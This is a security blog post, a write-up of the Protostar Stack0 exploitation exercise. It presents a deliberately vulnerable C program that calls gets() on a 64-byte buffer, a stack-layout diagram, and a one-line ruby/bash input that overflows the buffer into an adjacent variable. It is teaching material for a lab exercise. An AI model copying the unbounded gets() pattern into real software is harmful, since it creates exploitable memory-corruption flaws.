<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <title>zlowram's blog</title>
        <link href="/css/style.css" rel="stylesheet">
        <link href="/css/prism.css" rel="stylesheet" />
		<meta name="description" content="Yet another blog of another infosec enthusiast. CTFs, reversing, exploiting, coding and more.">
		<meta name="keywords" content="hacking, CTF, write-up, exploiting, reversing">
		<script>
		  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

		  ga('create', 'UA-93249230-1', 'auto');
		  ga('send', 'pageview');

		</script>
    </head>
    <body>

        <div class="container">

            <div class="site-nav">

            </div><!-- /.site-nav -->

            <div class="site-header">
                <pre>
$$\       $$\                                   $$\                                                          
$$ |      $$ |                                  $$ |                                                         
$$$$$$$\  $$ | $$$$$$\   $$$$$$\      $$$$$$$$\ $$ | $$$$$$\  $$\  $$\  $$\  $$$$$$\  $$$$$$\  $$$$$$\$$$$\  
$$  __$$\ $$ |$$  __$$\ $$  __$$\     \____$$  |$$ |$$  __$$\ $$ | $$ | $$ |$$  __$$\ \____$$\ $$  _$$  _$$\ 
$$ |  $$ |$$ |$$ /  $$ |$$ /  $$ |      $$$$ _/ $$ |$$ /  $$ |$$ | $$ | $$ |$$ |  \__|$$$$$$$ |$$ / $$ / $$ |
$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |     $$  _/   $$ |$$ |  $$ |$$ | $$ | $$ |$$ |     $$  __$$ |$$ | $$ | $$ |
$$$$$$$  |$$ |\$$$$$$  |\$$$$$$$ |<span class="title-dot">$$\</span> $$$$$$$$\ $$ |\$$$$$$  |\$$$$$\$$$$  |$$ |  <span class="title-dot">$$\</span>\$$$$$$$ |$$ | $$ | $$ |
\_______/ \__| \______/  \____$$ |<span class="title-dot">\__|</span>\________|\__| \______/  \_____\____/ \__|  <span class="title-dot">\__|</span>\_______|\__| \__| \__|
                        $$\   $$ |                                                                           
                        \$$$$$$  |                                                                           
                         \______/                   
                </pre>
            </div><!-- /.site-header -->

            <div class="row">
                <div class="nav-bar">
                    --| <a href="/">Home</a> |--
                </div><!-- /.nav-bar -->

                <div class="blog-post">
                    <h2 class="post-title">Exploit-exercises Protostar Stack0 write-up </h2>
                    <p class="post-meta">by zlowram on November 7, 2014</p> 
                    <p>This is going to be a series of posts with the write-ups of the exercises I solve from <a href="https://exploit-exercises.com/protostar">exploit-exercises&rsquo;s protostar</a>.</p>

<p>In this exercise we are asked to overwrite the value of the variable
&ldquo;modified&rdquo;, as it is the one checked in order to obtain the &ldquo;good boy&rdquo; message.</p>

<pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf(&quot;you have changed the 'modified' variable\n&quot;);
  } else {
      printf(&quot;Try again?\n&quot;);
  }
}
</code></pre>

<p>To do so, we need to have a clear vision of what would be the stack layout for
this code:</p>

<pre><code class="language-markup">+------------+ Lower addresses
|    ...     | 
+------------+
|   buffer   | 
|     .      | 
|     .      |
+------------+
|  modified  |
+------------+
| stored_ebp | 
+------------+
|    ret     | 
+------------+
|    argc    | 
+------------+
|    argv    | 
+------------+
|    ...     | 
+------------+ Higher addresses
</code></pre>

<p>If we take into account that the stack grows towards lower memory addresses,
and
that is written towards higher addresses, the exercise turns to be trivial to
solve.</p>

<p>You only need to stuff 64 bytes into &ldquo;buffer&rdquo;, with an extra byte with value
different than 0, to overwrite &ldquo;modified&rdquo;.</p>

<p>We will use ruby and bash for writing the solution to this exercise:</p>

<pre><code class="language-bash">#!/bin/bash

ruby -e ' puts &quot;A&quot;*64 + &quot;1&quot; ' | ./stack0
</code></pre>

                    <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
var disqus_shortname = 'nopatch'; // required: replace example with your forum shortname
var disqus_identifier = '/2014/11/7/exploit-exercises-protostar-stack0/';

/* * * DON'T EDIT BELOW THIS LINE * * */
(function() {
 var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
 dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

                </div><!-- /.blog-post -->

            </div><!-- /.row -->

        </div><!-- /.container -->
        <div class="footer">
            Powered by <a href="http://github.com/zlowram/blgo">blgo</a> 
        </div><!-- /.footer -->

        <!-- Prism.js -->
        <script src="/js/prism.js"></script>
    </body>
</html>
